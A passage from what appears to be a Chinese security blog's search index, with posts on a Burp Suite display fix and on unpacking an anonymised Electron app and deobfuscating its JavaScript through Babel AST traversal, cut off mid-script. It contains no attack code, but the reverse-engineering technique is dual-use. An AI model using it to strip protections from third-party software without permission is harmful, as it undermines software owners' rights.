href="https://blog.csdn.net/m0_46587008/article/details/111242376">文件上传之.htaccess和.user.ini_@LZD的博客-CSDN博客</a></p>]]></content>
    
    
    <categories>
      
      <category>学习</category>
      
      <category>CTF</category>
      
      <category>WEB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB</tag>
      
      <tag>学习</tag>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Burpsuite界面撕裂的解决方法</title>
    <link href="/2022/07/21/Burpsuite%E7%95%8C%E9%9D%A2%E6%92%95%E8%A3%82%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/"/>
    <url>/2022/07/21/Burpsuite%E7%95%8C%E9%9D%A2%E6%92%95%E8%A3%82%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-问题">0x00 问题</h2><p>去年换了新的笔记本电脑之后，就出现的这个问题……打开Burpsuite，只要是在文本框里面切换中文输入法，或者输入中文，就会出现如下图所示的画面撕裂、重影的现象。</p><p><img src="/2022/07/21/Burpsuite%E7%95%8C%E9%9D%A2%E6%92%95%E8%A3%82%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/image-20220721183438913.png" alt="画面撕裂"></p><h2 id="0x01-解决（重点！">0x01 解决（重点！)</h2><p>Burpsuite一般都有一个bat启动文件，在一大串的start的命令行中加入参数<code>-Dsun.java2d.d3d=false</code>即可解决问题！</p><h2 id="0x02-后记">0x02 后记</h2><p>一开始判断的是跟电脑的显卡或是显示器有关，因为毕竟换了电脑，配置也不一样了，其中提升最大的还是显卡和显示器。显卡变成了30系，显示器也是高刷屏……</p><p>更改N卡界面的相关设置，包括垂直同步、刷新率、G-syn统统无果……切换独显直连无果……切换显示屏刷新率无果……折腾了好长时间也没能解决。</p><p>好在用英文在谷歌上搜了一下，问题可算得以解决……</p><h2 id="0x03-参考">0x03 参考</h2><p><a href="https://forum.portswigger.net/thread/burp-suite-2021-2-1-application-screen-tearing-00aa26c5">Burp Suite 2021.2.1 Application Screen Tearing - Burp Suite User Forum (portswigger.net)</a></p>]]></content>
    
    
    <categories>
      
      <category>折腾</category>
      
    </categories>
    
    
    <tags>
      
      <tag>折腾</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>从调试某Electron应用看JS混淆</title>
    <link href="/2022/06/28/%E6%9F%90Electron%E5%BA%94%E7%94%A8%E7%9A%84JS%E8%B0%83%E8%AF%95%E8%BF%87%E7%A8%8B/"/>
    <url>/2022/06/28/%E6%9F%90Electron%E5%BA%94%E7%94%A8%E7%9A%84JS%E8%B0%83%E8%AF%95%E8%BF%87%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h2 id="0x01-解包">0x01 解包</h2><p>首先对Electron应用进行解包：<code>asar extract app.asar app</code>，解包文件会释放到当前目录下的app文件夹里。通过<code>package.json</code>可以看到入口js文件以及相关依赖：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;******&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;version&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;1.2.2&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;author&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;*****&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;description&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;*****&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;main&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;main/index.js&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;dependencies&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;@babel/generator&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;^7.18.2&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;@babel/parser&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;^7.18.5&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;@babel/traverse&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;^7.18.5&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;@nestjs/common&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;^8.2.4&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;@nestjs/core&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;^8.2.4&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;@nestjs/microservices&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;^8.2.4&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;bytenode&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;^1.3.6&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;electron-log&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;^4.4.6&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;electron-store&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;^8.0.1&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;electron-updater&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;^4.6.5&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;express&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;^4.17.3&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;fs-extra&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;^10.1.0&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;glob&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;^7.1.7&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;iconv-lite&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;^0.6.3&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;lodash&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;^4.17.21&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;md5&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;^2.3.0&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;mkdirp&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;^1.0.4&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;node-fetch&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;^2.6.7&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;protobufjs&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;^6.11.2&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;reflect-metadata&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;^0.1.13&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;rxjs&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;^7.5.1&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;semver&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;^7.3.7&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;systeminformation&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;^5.11.9&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;tcp-port-used&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;^1.0.2&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;url-parse&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;^1.5.10&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;uuid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;^8.3.2&quot;</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure><p>通过<code>&quot;main&quot;:&quot;main/index.js&quot;</code>可知入口JS文件在main子目录下的<code>index.js</code>文件。打开文件得到源码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js">(<span class="hljs-keyword">function</span>(<span class="hljs-params">_0x2c2b00,_0x266f24</span>)&#123;<span class="hljs-keyword">function</span> <span class="hljs-title function_">_0x495d9e</span>(<span class="hljs-params">_0x5c6e5d,_0x2e5990,_0x92ffbf,_0xd034a8,_0x357357</span>)&#123;<span class="hljs-keyword">return</span> <span class="hljs-title function_">_0x2428</span>(_0x357357- -<span class="hljs-number">0x87</span>,_0x2e5990);&#125;<span class="hljs-keyword">function</span> <span class="hljs-title function_">_0x245656</span>(<span class="hljs-params">_0x3c14a2,_0xf20f43,_0x684d2f,_0xbe1a9a,_0x4c1a31</span>)&#123;<span class="hljs-keyword">return</span> <span class="hljs-title function_">_0x2428</span>(_0xbe1a9a-<span class="hljs-number">0x39e</span>,_0x4c1a31);&#125;<span class="hljs-keyword">function</span> <span class="hljs-title function_">_0xf3f8ba</span>(<span class="hljs-params">_0x3bb4fe,_0x3abbcb,_0x5b1533,_0x12f9ce,_0x428add</span>)&#123;<span class="hljs-keyword">return</span> <span class="hljs-title function_">_0x2428</span>(_0x12f9ce-<span class="hljs-number">0x38e</span>,_0x3abbcb);&#125;<span class="hljs-keyword">var</span> _0x17d610=<span class="hljs-title function_">_0x2c2b00</span>();<span class="hljs-keyword">function</span> <span class="hljs-title function_">_0x3d68b3</span>(<span class="hljs-params">_0x2076a7,_0x106168,_0x234a88,_0x360ccc,_0x461c10</span>)&#123;<span class="hljs-keyword">return</span> <span class="hljs-title function_">_0x2428</span>(_0x234a88- -<span class="hljs-number">0x1b4</span>,_0x360ccc);&#125;<span class="hljs-keyword">while</span>(!![])&#123;<span class="hljs-keyword">try</span>&#123;<span class="hljs-keyword">var</span> _0x277bc2=<span class="hljs-built_in">parseInt</span>(<span class="hljs-title function_">_0x495d9e</span>(<span class="hljs-number">0x1d5</span>,<span class="hljs-string">&#x27;\x5a\x37\x47\x6d&#x27;</span>,<span class="hljs-number">0x267</span>,<span class="hljs-number">0x1b1</span>,<span class="hljs-number">0x231</span>))/<span class="hljs-number">0x1</span>+<span class="hljs-built_in">parseInt</span>(<span class="hljs-title function_">_0x495d9e</span>(<span class="hljs-number">0x224</span>,<span class="hljs-string">&#x27;\x24\x6a\x38\x33&#x27;</span>,<span class="hljs-number">0x18c</span>,<span class="hljs-number">0x17e</span>,<span class="hljs-number">0x211</span>))/<span class="hljs-number">0x2</span>+<span class="hljs-built_in">parseInt</span>(<span class="hljs-title function_">_0x495d9e</span>(<span class="hljs-number">0x255</span>,<span class="hljs-string">&#x27;\x40\x77\x78\x28&#x27;</span>,<span class="hljs-number">0x201</span>,<span class="hljs-number">0x279</span>,<span class="hljs-number">0x1ff</span>))/<span class="hljs-number">0x3</span>*(-<span class="hljs-built_in">parseInt</span>(<span class="hljs-title function_">_0x495d9e</span>(<span class="hljs-number">0x29a</span>,<span class="hljs-string">&#x27;\x34\x64\x67\x33&#x27;</span>,<span class="hljs-number">0x2fc</span>,<span class="hljs-number">0x2a5</span>,<span class="hljs-number">0x253</span>))/<span class="hljs-number">0x4</span>)+<span class="hljs-built_in">parseInt</span>(<span class="hljs-title function_">_0x3d68b3</span>(<span class="hljs-number">0xcb</span>,<span class="hljs-number">0x2b</span>,<span class="hljs-number">0xb6</span>,<span class="hljs-string">&#x27;\x6c\x40\x4a\x75&#x27;</span>,<span class="hljs-number">0x14a</span>))/<span class="hljs-number">0x5</span>+<span class="hljs-built_in">parseInt</span>(<span class="hljs-title function_">_0x495d9e</span>(<span class="hljs-number">0x158</span>,<span class="hljs-string">&#x27;\x67\x52\x72\x4f&#x27;</span>,<span class="hljs-number">0xdc</span>,<span class="hljs-number">0x1ee</span>,<span class="hljs-number">0x133</span>))/<span class="hljs-number">0x6</span>+<span class="hljs-built_in">parseInt</span>(<span class="hljs-title function_">_0x495d9e</span>(<span class="hljs-number">0xe6</span>,<span class="hljs-string">&#x27;\x41\x38\x39\x68&#x27;</span>,<span class="hljs-number">0x130</span>,<span class="hljs-number">0xbc</span>,<span class="hljs-number">0x14d</span>))/<span class="hljs-number">0x7</span>*(<span class="hljs-built_in">parseInt</span>(<span class="hljs-title function_">_0x245656</span>(<span class="hljs-number">0x52c</span>,<span class="hljs-number">0x52c</span>,<span class="hljs-number">0x62d</span>,<span class="hljs-number">0x5e3</span>,<span class="hljs-string">&#x27;\x79\x41\x4a\x78&#x27;</span>))/<span class="hljs-number">0x8</span>)+-<span class="hljs-built_in">parseInt</span>(<span class="hljs-title function_">_0xf3f8ba</span>(<span class="hljs-number">0x5cc</span>,<span class="hljs-string">&#x27;\x41\x66\x4d\x28&#x27;</span>,<span class="hljs-number">0x60f</span>,<span class="hljs-number">0x609</span>,<span class="hljs-number">0x575</span>))/<span class="hljs-number">0x9</span>*(<span class="hljs-built_in">parseInt</span>(<span class="hljs-title function_">_0x495d9e</span>(<span class="hljs-number">0x21e</span>,<span class="hljs-string">&#x27;\x6c\x7a\x29\x30&#x27;</span>,<span class="hljs-number">0x1e0</span>,<span class="hljs-number">0xd5</span>,<span class="hljs-number">0x172</span>))/<span class="hljs-number">0xa</span>);<span class="hljs-keyword">if</span>(_0x277bc2===_0x266f24)<span class="hljs-keyword">break</span>;<span class="hljs-keyword">else</span> _0x17d610[<span class="hljs-string">&#x27;push&#x27;</span>](_0x17d610[<span class="hljs-string">&#x27;shift&#x27;</span>]());&#125;<span class="hljs-keyword">catch</span>(_0x546e2a)&#123;_0x17d610[<span class="hljs-string">&#x27;push&#x27;</span>](_0x17d610[<span class="hljs-string">&#x27;shift&#x27;</span>]());&#125;&#125;&#125;(_0x4a83,<span class="hljs-number">0x213df</span>));<span class="hljs-keyword">function</span> <span class="hljs-title function_">_0x2428</span>(<span class="hljs-params">_0x222817,_0x44b30d</span>)&#123;<span class="hljs-keyword">var</span> _0x30921e=<span class="hljs-title function_">_0x4a83</span>();<span class="hljs-keyword">return</span> _0x2428=<span class="hljs-keyword">function</span>(<span class="hljs-params">_0xb30ec8,_0x2748e6</span>)&#123;_0xb30ec8=_0xb30ec8-<span class="hljs-number">0x175</span>;<span class="hljs-keyword">var</span> _0x4a83e9=_0x30921e[_0xb30ec8];<span class="hljs-keyword">if</span>(_0x2428[<span class="hljs-string">&#x27;\x6f\x4e\x59\x48\x4d\x4f&#x27;</span>]===<span class="hljs-literal">undefined</span>)&#123;<span class="hljs-keyword">var</span> _0x2428bb=<span class="hljs-keyword">function</span>(<span class="hljs-params">_0xdad3f3</span>)&#123;<span class="hljs-keyword">var</span> _0x322eb2=<span class="hljs-string">&#x27;\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x2b\x2f\x3d&#x27;</span>;<span class="hljs-keyword">var</span> _0x42cc1a=<span class="hljs-string">&#x27;&#x27;</span>,_0x3bd1d2=<span class="hljs-string">&#x27;&#x27;</span>,_0x20b060=_0x42cc1a+_0x2428bb;<span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> _0x140781=<span class="hljs-number">0x0</span>,_0x3b67a1,_0x2ed931,_0x43927d=<span class="hljs-number">0x0</span>;_0x2ed931=_0xdad3f3[<span class="hljs-string">&#x27;\x63\x68\x61\x72\x41\x74&#x27;</span>](_0x43927d++);~_0x2ed931&amp;&amp;(_0x3b67a1=_0x140781%<span class="hljs-number">0x4</span>?_0x3b67a1*<span class="hljs-number">0x40</span>+<span class="hljs-attr">_0x2ed931</span>:_0x2ed931,_0x140781++%<span class="hljs-number">0x4</span>)?_0x42cc1a+=_0x20b060[<span class="hljs-string">&#x27;\x63\x68\x61\x72\x43\x6f\x64\x65\x41\x74&#x27;</span>](_0x43927d+<span class="hljs-number">0xa</span>)-<span class="hljs-number">0xa</span>!==<span class="hljs-number">0x0</span>?<span class="hljs-title class_">String</span>[<span class="hljs-string">&#x27;\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65&#x27;</span>](<span class="hljs-number">0xff</span>&amp;_0x3b67a1&gt;&gt;(-<span class="hljs-number">0x2</span>*_0x140781&amp;<span class="hljs-number">0x6</span>)):<span class="hljs-attr">_0x140781</span>:<span class="hljs-number">0x0</span>)&#123;_0x2ed931=_0x322eb2[<span class="hljs-string">&#x27;\x69\x6e\x64\x65\x78\x4f\x66&#x27;</span>](_0x2ed931);&#125;<span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> _0x4d79cc=<span class="hljs-number">0x0</span>,_0x149750=_0x42cc1a[<span class="hljs-string">&#x27;\x6c\x65\x6e\x67\x74\x68&#x27;</span>];_0x4d79cc&lt;_0x149750;_0x4d79cc++)&#123;_0x3bd1d2+=<span class="hljs-string">&#x27;\x25&#x27;</span>+(<span class="hljs-string">&#x27;\x30\x30&#x27;</span>+_0x42cc1a[<span class="hljs-string">&#x27;\x63\x68\x61\x72\x43\x6f\x64\x65\x41\x74&#x27;</span>](_0x4d79cc)[<span class="hljs-string">&#x27;\x74\x6f\x53\x74\x72\x69\x6e\x67&#x27;</span>](<span class="hljs-number">0x10</span>))[<span class="hljs-string">&#x27;\x73\x6c\x69\x63\x65&#x27;</span>](-<span class="hljs-number">0x2</span>);&#125;<span class="hljs-keyword">return</span> <span class="hljs-built_in">decodeURIComponent</span>(_0x3bd1d2);&#125;;<span class="hljs-keyword">var</span> _0x3ee60f=<span class="hljs-keyword">function</span>(<span class="hljs-params">_0x56923f,_0x4dd766</span>)&#123;<span class="hljs-keyword">var</span> _0x1c8920=[],_0x3cd08d=<span class="hljs-number">0x0</span>,_0x1a10c0,_0x43d367=<span class="hljs-string">&#x27;&#x27;</span>;_0x56923f=<span class="hljs-title function_">_0x2428bb</span>(_0x56923f)...<br><span class="hljs-comment">//代码太长了就不完全展示了...</span><br></code></pre></td></tr></table></figure><h2 id="0x02-混淆的简单理解">0x02 混淆的简单理解</h2><p>混淆的原理，按我个人的理解，就是把简单的代码复杂化。比如<code>var a=1</code>这个表达式，混淆之后可以是<code>var a=99;a=a-98;a=a+2-3;++a;--a;++a</code>，实际上，变量a的值（或者说a的语义）并没有发生改变。但是，<strong>数组</strong>混淆之后，其序列内原本的成员顺序改变了，语义怎么保持和原来一致呢？所以，混淆后的JS代码可能会存在<strong>数组排序</strong>的问题。</p><h3 id="数组排序">数组排序</h3><p>以解混淆后的数组排序代码为例：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js">  <span class="hljs-keyword">while</span> (!![]) &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>      <span class="hljs-keyword">var</span> _0x277bc2 = <span class="hljs-built_in">parseInt</span>(<span class="hljs-title function_">_0x495d9e</span>(<span class="hljs-number">469</span>, <span class="hljs-string">&quot;Z7Gm&quot;</span>, <span class="hljs-number">615</span>, <span class="hljs-number">433</span>, <span class="hljs-number">561</span>)) / <span class="hljs-number">1</span> + <span class="hljs-built_in">parseInt</span>(<span class="hljs-title function_">_0x495d9e</span>(<span class="hljs-number">548</span>, <span class="hljs-string">&quot;$j83&quot;</span>, <span class="hljs-number">396</span>, <span class="hljs-number">382</span>, <span class="hljs-number">529</span>)) / <span class="hljs-number">2</span> + <span class="hljs-built_in">parseInt</span>(<span class="hljs-title function_">_0x495d9e</span>(<span class="hljs-number">597</span>, <span class="hljs-string">&quot;@wx(&quot;</span>, <span class="hljs-number">513</span>, <span class="hljs-number">633</span>, <span class="hljs-number">511</span>)) / <span class="hljs-number">3</span> * (-<span class="hljs-built_in">parseInt</span>(<span class="hljs-title function_">_0x495d9e</span>(<span class="hljs-number">666</span>, <span class="hljs-string">&quot;4dg3&quot;</span>, <span class="hljs-number">764</span>, <span class="hljs-number">677</span>, <span class="hljs-number">595</span>)) / <span class="hljs-number">4</span>) + <span class="hljs-built_in">parseInt</span>(<span class="hljs-title function_">_0x3d68b3</span>(<span class="hljs-number">203</span>, <span class="hljs-number">43</span>, <span class="hljs-number">182</span>, <span class="hljs-string">&quot;l@Ju&quot;</span>, <span class="hljs-number">330</span>)) / <span class="hljs-number">5</span> + <span class="hljs-built_in">parseInt</span>(<span class="hljs-title function_">_0x495d9e</span>(<span class="hljs-number">344</span>, <span class="hljs-string">&quot;gRrO&quot;</span>, <span class="hljs-number">220</span>, <span class="hljs-number">494</span>, <span class="hljs-number">307</span>)) / <span class="hljs-number">6</span> + <span class="hljs-built_in">parseInt</span>(<span class="hljs-title function_">_0x495d9e</span>(<span class="hljs-number">230</span>, <span class="hljs-string">&quot;A89h&quot;</span>, <span class="hljs-number">304</span>, <span class="hljs-number">188</span>, <span class="hljs-number">333</span>)) / <span class="hljs-number">7</span> * (<span class="hljs-built_in">parseInt</span>(<span class="hljs-title function_">_0x245656</span>(<span class="hljs-number">1324</span>, <span class="hljs-number">1324</span>, <span class="hljs-number">1581</span>, <span class="hljs-number">1507</span>, <span class="hljs-string">&quot;yAJx&quot;</span>)) / <span class="hljs-number">8</span>) + -<span class="hljs-built_in">parseInt</span>(<span class="hljs-title function_">_0xf3f8ba</span>(<span class="hljs-number">1484</span>, <span class="hljs-string">&quot;AfM(&quot;</span>, <span class="hljs-number">1551</span>, <span class="hljs-number">1545</span>, <span class="hljs-number">1397</span>)) / <span class="hljs-number">9</span> * (<span class="hljs-built_in">parseInt</span>(<span class="hljs-title function_">_0x495d9e</span>(<span class="hljs-number">542</span>, <span class="hljs-string">&quot;lz)0&quot;</span>, <span class="hljs-number">480</span>, <span class="hljs-number">213</span>, <span class="hljs-number">370</span>)) / <span class="hljs-number">10</span>);<br><br>      <span class="hljs-keyword">if</span> (_0x277bc2 === _0x266f24) <span class="hljs-keyword">break</span>;<span class="hljs-keyword">else</span> _0x17d610[<span class="hljs-string">&quot;push&quot;</span>](_0x17d610[<span class="hljs-string">&quot;shift&quot;</span>]());<br>    &#125; <span class="hljs-keyword">catch</span> (_0x546e2a) &#123;<br>      _0x17d610[<span class="hljs-string">&quot;push&quot;</span>](_0x17d610[<span class="hljs-string">&quot;shift&quot;</span>]());<br>    &#125;<br>  &#125;<br>&#125;)(_0x4a83, <span class="hljs-number">136159</span>);<br></code></pre></td></tr></table></figure><p>可以看到当<code>(_0x277bc2</code>与<code>_0x266f24</code><strong>全等</strong>时，循环才会跳出。如果不全等，则会执行<code>push</code>和<code>shift</code>操作，在数组末尾添加成员，或移除数组成员。以后在混淆的JS代码中，看到循环里对数组的<code>push</code>和<code>shift</code>，可以先尝试理解成数组排序。</p><h2 id="0x03-解混淆">0x03 解混淆</h2><p>在这里，先用<a href="http://jsnice.org/">JS NICE: Statistical renaming, Type inference and Deobfuscation</a>工具解混淆。这个工具可以将混淆的代码格式化，来变的更可读。但实际在调试过程中，如果遇到函数码表这类反调试措施可能无法让JS文件正常调试下去，具体细节下文会详细说明。</p><p>通过工具得到反混淆后代码。此处省略，因为代码太多了笔记会卡就不贴上了。</p><h3 id="AST树解混淆">AST树解混淆</h3><p>如果是手动反混淆的话，**抽象语法树（Abstract Syntax Tree，AST）**是一个很好的工具。它把JS文件中的每个语句都拆成类似JSON这种树状结构的数据类型，以树状的形式表示JS文件的语法结构，树上的每个结点都表示源代码的一种结构。具体进行分析时，我们可以使用<a href="https://astexplorer.net/">AST explorer</a>对语句进行分析。</p><p>在使用ASTexplorer之前，需要把Parser设置为<code>@bebel/parser</code>，这是因为在第一节解包的时候发现该应用依赖于<code>@bebel/parser</code>，所以要设置成这个格式。</p><p><img src="/2022/06/28/%E6%9F%90Electron%E5%BA%94%E7%94%A8%E7%9A%84JS%E8%B0%83%E8%AF%95%E8%BF%87%E7%A8%8B/image-20220628145039853.png" alt></p><p>混淆的源码中，存在着大量类似<code>\x63\x64\x65\x66</code>与<code>0xff</code>这类十六进制数据，我们可以直接对其进行解析：</p><p><img src="/2022/06/28/%E6%9F%90Electron%E5%BA%94%E7%94%A8%E7%9A%84JS%E8%B0%83%E8%AF%95%E8%BF%87%E7%A8%8B/image-20220628145152082.png" alt></p><p>同样的，AST树中也是直接把这些十六进制的数据给出来了：</p><p><img src="/2022/06/28/%E6%9F%90Electron%E5%BA%94%E7%94%A8%E7%9A%84JS%E8%B0%83%E8%AF%95%E8%BF%87%E7%A8%8B/image-20220628145647788.png" alt></p><p>可以观察到，最后的值<code>value</code>的父节点是<code>StringLiteral</code>和<code>NumericLiteral</code>。我们可以使用<code>@babel/generator</code>生成混淆代码的AST树，通过<code>@babel/traverse</code>遍历每个节点，找到从<code>@babel/types</code>引用的数据类型后，提取<code>value</code>替换即可达到一个简单的反混淆效果。</p><p>下面是一个替换十六进制字符串的简单示例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>) <span class="hljs-comment">//导入fs包，读写文件</span><br><br><span class="hljs-keyword">var</span> parser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;@babel/parser&#x27;</span>) <span class="hljs-comment">//用于解析AST树</span><br><span class="hljs-keyword">var</span> traverse = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;@babel/traverse&#x27;</span>).<span class="hljs-property">default</span> <span class="hljs-comment">//遍历AST树</span><br><span class="hljs-keyword">var</span> generator = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;@babel/generator&#x27;</span>).<span class="hljs-property">default</span> <span class="hljs-comment">//生成AST树</span><br><br><span class="hljs-keyword">const</span> &#123;<span class="hljs-title class_">StringLiteral</span>,<span class="hljs-title class_">NumericLiteral</span>&#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;@babel/types&#x27;</span>) <span class="hljs-comment">//导入数据类型</span><br><br><span class="hljs-keyword">let</span> t_code = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;index.js&#x27;</span>,&#123;<span class="hljs-attr">encoding</span>:<span class="hljs-string">&quot;utf-8&quot;</span>&#125;) <span class="hljs-comment">//读混淆代码</span><br><span class="hljs-keyword">let</span> ast = parser.<span class="hljs-title function_">parse</span>(t_code) <span class="hljs-comment">//将读取的代码解析成AST树</span><br><br><span class="hljs-title function_">traverse</span>(ast,&#123;<span class="hljs-comment">//对指定的数据类型结点进行遍历，生成操作后的代码ast</span><br>    <span class="hljs-title class_">StringLiteral</span>(path)&#123;<br>        <span class="hljs-keyword">let</span> value = path.<span class="hljs-property">node</span>.<span class="hljs-property">value</span> <span class="hljs-comment">//获得StringLiteral节点的value值</span><br>        path.<span class="hljs-title function_">replaceWith</span>(<span class="hljs-title class_">StringLiteral</span>(value)) <span class="hljs-comment">//对当前路径的value值进行替换</span><br>        path.<span class="hljs-title function_">skip</span>() <span class="hljs-comment">//跳往下个节点</span><br>    &#125;,<br><br>    <span class="hljs-title class_">NumericLiteral</span>(path)&#123;<br>        <span class="hljs-keyword">let</span> value = 